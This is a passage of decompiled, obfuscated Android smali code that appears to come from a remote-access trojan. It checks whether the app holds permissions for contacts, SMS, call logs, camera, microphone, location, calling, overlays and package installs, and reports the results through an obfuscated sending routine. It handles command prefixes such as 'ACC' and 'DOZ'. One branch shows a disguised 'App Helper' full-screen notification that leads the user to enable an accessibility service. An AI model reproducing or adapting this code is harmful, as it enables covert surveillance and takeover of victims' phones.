    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-ne v0, v8, :cond_3d

    move-object v0, v14

    goto :goto_d

    :cond_3d
    move-object v0, v6

    .line 905
    :goto_d
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x17

    if-lt v5, v7, :cond_4d

    .line 906
    aget-object v5, p1, v3

    const-string v7, "android.permission.READ_CONTACTS"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_3e

    .line 907
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_e

    .line 909
    :cond_3e
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 911
    :goto_e
    aget-object v5, p1, v3

    const-string v7, "android.permission.READ_SMS"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_3f

    .line 912
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_f

    .line 914
    :cond_3f
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 916
    :goto_f
    aget-object v5, p1, v3

    const-string v7, "android.permission.READ_CALL_LOG"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_40

    .line 917
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_10

    .line 919
    :cond_40
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 921
    :goto_10
    aget-object v5, p1, v3

    const-string v7, "android.permission.CAMERA"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_41

    .line 922
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_11

    .line 924
    :cond_41
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 926
    :goto_11
    aget-object v5, p1, v3

    const-string v7, "android.permission.GET_ACCOUNTS"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_42

    .line 927
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_12

    .line 929
    :cond_42
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 931
    :goto_12
    aget-object v5, p1, v3

    const-string v7, "android.permission.RECORD_AUDIO"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_43

    .line 932
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_13

    .line 934
    :cond_43
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 936
    :goto_13
    aget-object v5, p1, v3

    const-string v7, "android.permission.ACCESS_FINE_LOCATION"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_44

    aget-object v5, p1, v3

    const-string v7, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_44

    .line 937
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_14

    .line 939
    :cond_44
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 941
    :goto_14
    aget-object v5, p1, v3

    const-string v7, "android.permission.CALL_PHONE"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_45

    .line 942
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_15

    .line 944
    :cond_45
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 948
    :goto_15
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 950
    aget-object v5, p1, v3

    const-string v7, "android.permission.SEND_SMS"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_46

    .line 951
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_16

    .line 953
    :cond_46
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 955
    :goto_16
    aget-object v5, p1, v3

    const-string v7, "android.permission.SET_WALLPAPER"

    invoke-virtual {v5, v7}, Landroid/content/Context;->checkSelfPermission(Ljava/lang/String;)I

    move-result v5

    if-nez v5, :cond_47

    .line 956
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_17

    .line 958
    :cond_47
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 961
    :goto_17
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v0, p1, v3

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->is_dostuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53zemode(Landroid/content/Context;)Z

    move-result v0

    if-ne v0, v8, :cond_48

    move-object v0, v14

    goto :goto_18

    :cond_48
    move-object v0, v6

    :goto_18
    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 962
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v7, 0x17

    if-lt v5, v7, :cond_4a

    .line 964
    aget-object v5, p1, v3

    invoke-static {v5}, Landroid/provider/Settings;->canDrawOverlays(Landroid/content/Context;)Z

    move-result v5

    if-eqz v5, :cond_49

    .line 965
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_19

    .line 967
    :cond_49
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_19

    .line 971
    :cond_4a
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 973
    :goto_19
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v5, v10, :cond_4c

    .line 975
    aget-object v5, p1, v3

    invoke-virtual {v5}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/pm/PackageManager;->canRequestPackageInstalls()Z

    move-result v5

    if-nez v5, :cond_4b

    .line 977
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1a

    .line 979
    :cond_4b
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1a

    .line 982
    :cond_4c
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v14}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    goto :goto_1a

    .line 986
    :cond_4d
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "1>1>1>1>1>1>1>1>1>1>1>1>1>1>1>"

    invoke-virtual {v5, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 990
    :goto_1a
    sget-object v5, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->PermissionsM:Ljava/lang/String;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "{L}"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v5, v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->ewyayeonlnxbxvjjsatsqohmbcxqfsimqcwqwdzhjaqnilufqh52(Ljava/lang/String;[B)V

    goto/16 :goto_2a

    :cond_4e
    const-string v6, "ACC"

    .line 993
    invoke-virtual {v5, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v6

    if-eqz v6, :cond_51

    .line 994
    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/AccessService;

    invoke-static {v5, v6}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->isAccessibilityServiceEnabled(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v5
    :try_end_35
    .catch Ljava/lang/Exception; {:try_start_35 .. :try_end_35} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_35 .. :try_end_35} :catch_15

    if-nez v5, :cond_af

    .line 997
    :try_start_36
    sget v5, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v5, v10, :cond_50

    .line 998
    aget-object v5, p1, v3

    const-class v6, Landroid/app/NotificationManager;

    invoke-virtual {v5, v6}, Landroid/content/Context;->getSystemService(Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/app/NotificationManager;

    if-eqz v5, :cond_4f

    const-string v6, "Access"

    .line 1000
    invoke-virtual {v5, v6}, Landroid/app/NotificationManager;->getNotificationChannel(Ljava/lang/String;)Landroid/app/NotificationChannel;

    move-result-object v6

    if-nez v6, :cond_4f

    .line 1001
    new-instance v6, Landroid/app/NotificationChannel;

    const-string v9, "Access"

    const-string v10, "UPDATE7"

    invoke-direct {v6, v9, v10, v7}, Landroid/app/NotificationChannel;-><init>(Ljava/lang/String;Ljava/lang/CharSequence;I)V

    const-string v7, "App Helper"

    .line 1002
    invoke-virtual {v7, v0, v11}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Landroid/app/NotificationChannel;->setDescription(Ljava/lang/String;)V

    .line 1003
    invoke-virtual {v6, v3}, Landroid/app/NotificationChannel;->setShowBadge(Z)V

    const/4 v0, 0x0

    .line 1004
    invoke-virtual {v6, v0, v0}, Landroid/app/NotificationChannel;->setSound(Landroid/net/Uri;Landroid/media/AudioAttributes;)V

    .line 1005
    invoke-virtual {v5, v6}, Landroid/app/NotificationManager;->createNotificationChannel(Landroid/app/NotificationChannel;)V
    :try_end_36
    .catch Ljava/lang/Exception; {:try_start_36 .. :try_end_36} :catch_8
    .catch Ljava/lang/OutOfMemoryError; {:try_start_36 .. :try_end_36} :catch_15

    goto :goto_1b

    .line 1009
    :cond_4f
    :try_start_37
    aget-object v0, p1, v3

    const/16 v5, 0x1e63

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->cancelnotification(Landroid/content/Context;I)V
    :try_end_37
    .catch Ljava/lang/Exception; {:try_start_37 .. :try_end_37} :catch_7
    .catch Ljava/lang/OutOfMemoryError; {:try_start_37 .. :try_end_37} :catch_15

    .line 1014
    :catch_7
    :cond_50
    :goto_1b
    :try_start_38
    new-instance v0, Landroid/content/Intent;

    aget-object v5, p1, v3

    const-class v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-direct {v0, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 1015
    invoke-virtual {v0, v13}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 1016
    aget-object v5, p1, v3

    const/high16 v6, 0xc000000

    invoke-static {v5, v3, v0, v6}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    .line 1018
    new-instance v5, Landroidx/core/app/NotificationCompat$Builder;

    aget-object v6, p1, v3

    const-string v7, "Access"

    invoke-direct {v5, v6, v7}, Landroidx/core/app/NotificationCompat$Builder;-><init>(Landroid/content/Context;Ljava/lang/String;)V

    const v6, 0x106000d

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSmallIcon(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->completeinstallnotifi_title:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentTitle(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    sget-object v6, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->completeinstallnotifi_msg:Ljava/lang/String;

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setContentText(Ljava/lang/CharSequence;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const/4 v6, -0x1

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setPriority(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const-string v7, "sys"

    invoke-virtual {v5, v7}, Landroidx/core/app/NotificationCompat$Builder;->setCategory(Ljava/lang/String;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setDefaults(I)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v8}, Landroidx/core/app/NotificationCompat$Builder;->setOngoing(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    const/4 v6, 0x0

    invoke-virtual {v5, v6}, Landroidx/core/app/NotificationCompat$Builder;->setSound(Landroid/net/Uri;)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v3}, Landroidx/core/app/NotificationCompat$Builder;->setAutoCancel(Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v5

    invoke-virtual {v5, v0, v8}, Landroidx/core/app/NotificationCompat$Builder;->setFullScreenIntent(Landroid/app/PendingIntent;Z)Landroidx/core/app/NotificationCompat$Builder;

    move-result-object v0

    .line 1020
    aget-object v5, p1, v3

    invoke-static {v5}, Landroidx/core/app/NotificationManagerCompat;->from(Landroid/content/Context;)Landroidx/core/app/NotificationManagerCompat;

    move-result-object v5

    .line 1022
    invoke-virtual {v0}, Landroidx/core/app/NotificationCompat$Builder;->build()Landroid/app/Notification;

    move-result-object v0

    const/16 v6, 0x1e63

    invoke-virtual {v5, v6, v0}, Landroidx/core/app/NotificationManagerCompat;->notify(ILandroid/app/Notification;)V
    :try_end_38
    .catch Ljava/lang/Exception; {:try_start_38 .. :try_end_38} :catch_8
    .catch Ljava/lang/OutOfMemoryError; {:try_start_38 .. :try_end_38} :catch_15

    .line 1027
    :catch_8
    :try_start_39
    aget-object v0, p1, v3

    new-instance v5, Landroid/content/Intent;

    aget-object v6, p1, v3

    const-class v7, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/isrjhroorjshhuhvaoyxhzihjosgyxaalfopwxsqtcaxyhmbzs20;

    invoke-direct {v5, v6, v7}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v5, v13}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v5

    const/high16 v6, 0x800000

    invoke-virtual {v5, v6}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 1029
    aget-object v0, p1, v3

    const/16 v5, 0x1e63

    invoke-static {v0, v5}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/lrnkvbkuoyhwwjjclyatabmdqjrxgnnkcjvzuleormlwhiwnjt3/tiioyslylawbjfcuduydnfhcaxjywhxvgxwusxnoltefbuxqqj38;->cancelnotification(Landroid/content/Context;I)V

    goto/16 :goto_2a

    :cond_51
    const-string v0, "DOZ"

    .line 1033
    invoke-virtual {v5, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_56

    .line 1034
    aget-object v0, p1, v3

    invoke-static {v0}, L[EAGLE3_PACK3]/vhasjbytsejmchjytybqaiucxsovcftvkngegomeqdvgmgvqzg2/ymohvcbrknsnxeoujrdhblrwadynhwynfqzklncagrzgjnbnxk4/utilities;->is_dostuoxctjtdaoeuivbicuhkpiflkolbbmlmpdazwmgcmmbmmdif53zemode(Landroid/content/Context;)Z

    move-result v0
    :try_end_39
    .catch Ljava/lang/Exception; {:try_start_39 .. :try_end_39} :catch_14
    .catch Ljava/lang/OutOfMemoryError; {:try_start_39 .. :try_end_39} :catch_15

    if-nez v0, :cond_55

    .line 1036
    :try_start_3a
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v0, v10, :cond_53

    .line 1037
    aget-object v0, p1, v3
